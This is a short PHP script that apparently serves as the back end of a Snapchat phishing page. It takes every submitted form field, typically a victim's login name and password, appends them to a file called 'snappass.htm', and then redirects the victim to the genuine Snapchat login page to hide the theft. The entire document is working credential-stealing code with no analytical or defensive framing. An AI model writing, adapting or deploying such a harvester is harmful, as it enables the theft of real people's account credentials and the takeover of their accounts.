<?php
header ('Location:https://accounts.snapchat.com/accountz/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome');
$handle = fopen("snappass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>